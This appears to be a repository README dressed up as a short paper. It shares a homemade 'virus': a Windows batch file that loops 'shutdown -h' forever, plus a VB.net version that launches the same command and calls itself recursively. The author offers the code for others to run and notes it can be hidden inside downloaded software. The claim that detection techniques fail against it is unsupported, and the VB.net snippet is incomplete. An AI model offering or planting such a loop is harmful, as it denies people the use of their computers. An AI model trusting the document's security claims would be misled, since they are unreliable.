# MyVirus
My malware virus 

Failure of Malware detection Techniques in front
Wadï Mami Malware
Date of publication : 10/08/2020
Author : Wadï Mami
e-mail : didipostman77@gmail.com

Abstract :

Many malware analysis and detection techniques are studied and compared. But none of them is able to detect My Malware. A Malware that works fine for Windows 2000/XP/7/8/10 which makes it severe but not very dangereous as it causes a Dos a denial of service Well a denial of all services as your Windows Pc or Laptop is intact but you can’t make use of it any more till a specialist intervention.

Wadï Mami Malware : Here I share with you myvirus.bat file virus code it can be converted to .exe or .com myvirus.bat code :

------------------------------------------------ 

echo off 

rem clean screen

cls 

rem definition return point

:loop 

rem execute shutdown -h 

shutdown -h 

rem return to :loop 

goto loop 

--------------------------------------------------

If you excuted it is your own risks don’t blame me if you excuted it is your own risks don’t blame me. That kind of code can be hidden in software you use or you download and install. It works fine for windows 2000/XP/7/8/10.

Moreover here a VB.net equivalent code to the .bat DOS Shell above A VB.net Source Code as an example It works fine for Windows XP/7/8/10. 

--------------------------------------------------------- 

Imports System.Runtime.InteropServices 

Module Module1 

Sub Main()

Dim process As Process = process.Start("cmd","/C shutdown -h")

Main() 

End Sub

--------------------------------------------------

As you can see all high generation Languages can exploit this DOS command shutdown –h which leads to a DoS a denial of service well a denial of all the services as your Windows Pc is intact but you can’t make use of it.

Conclusion :

What is the solution to avoid this kind of exploit of this DOS command shutdown.
Shall Microsoft Depricated it or shall keep it assuming security measurements in using it.
